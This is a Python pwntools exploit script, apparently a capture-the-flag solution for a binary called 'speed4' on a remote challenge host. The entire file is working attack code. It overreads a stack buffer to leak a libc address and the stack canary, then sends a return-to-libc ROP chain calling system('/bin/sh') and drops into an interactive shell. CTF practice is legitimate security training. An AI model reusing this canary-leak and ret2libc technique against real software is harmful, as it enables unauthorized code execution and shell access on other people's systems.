#!/usr/bin/python

from pip import main
from pwn import *
import sys

remote_ip, port = 'speed-04.hfsc.tf', 34500
binary = './speed4'
brkpts = '''
'''

elf = ELF("speed4")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0).encode()))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

if __name__ == "__main__":
    payload = "a"*32

    sla("b0f: ", payload)
    reu("a"*32)

    libc.address = uu64(re(6)) - 0x1f12e8
    log.info("libc @ "+hex(libc.address))

    payload = "a"*0x49
    sla("b0f: ", payload)
    reu("a"*0x49)

    canary = u64(b"\x00" + re(7))

    payload = b"a"*0x48 + flat([
        canary,
        0,
        next(libc.search(asm("pop rdi; ret"))),
        next(libc.search(b"/bin/sh\x00")),
        next(libc.search(asm("pop rdi; ret"))) + 1,
        libc.symbols['system']
    ])

    sla("b0f: ", payload)

    io.interactive()
